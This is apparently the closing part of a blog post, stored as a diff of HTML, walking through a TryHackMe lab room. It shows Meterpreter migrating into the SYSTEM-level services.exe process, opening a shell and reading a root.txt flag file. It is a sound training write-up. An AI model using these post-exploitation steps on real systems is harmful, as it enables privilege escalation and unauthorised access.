+ <span style="color:#ae81ff">1912</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
+ <span style="color:#ae81ff">2160</span>  <span style="color:#ae81ff">1820</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
+ <span style="color:#ae81ff">2184</span>  <span style="color:#ae81ff">668</span>   SearchIndexer.exe     x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\S</span>earchIndexer.exe
+ <span style="color:#ae81ff">2244</span>  <span style="color:#ae81ff">668</span>   taskhost.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\t</span>askhost.exe
+ <span style="color:#ae81ff">2664</span>  <span style="color:#ae81ff">1612</span>  payload.exe           x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject<span style="color:#ae81ff">\p</span>ayload.exe
+ <span style="color:#ae81ff">2972</span>  <span style="color:#ae81ff">668</span>   sppsvc.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ppsvc.exe
+ <span style="color:#ae81ff">3008</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
+
+</code></pre></div><p>The room itself recommends us to use <strong>services.exe</strong> process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
+
+</code></pre></div><p>The first numeric value corresponds to the <strong>PID</strong> process ID. So let&rsquo;s migrate!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; migrate <span style="color:#ae81ff">668</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2664</span> to 668...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
+meterpreter &gt; 
+</code></pre></div><p>Yay! we did it, we migrated to a privileged process successfully.</p>
+<p>Let&rsquo;s see what is the last question or objective of this room</p>
+<blockquote>
+<p>Question #5: <strong>read the root.txt file at C:\Windows\System32\config</strong></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
+Process <span style="color:#ae81ff">2728</span> created.
+Channel <span style="color:#ae81ff">1</span> created.
+Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd config
+cd config
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;type root.txt
+type root.txt
+<span style="color:#f92672">{</span>THIS IS THE FLAG VALUE<span style="color:#f92672">}</span>
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;
+
+</code></pre></div><p>And that&rsquo;s all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I&rsquo;m sure there are other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove useful to other noob-level ethical hackers out there.</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
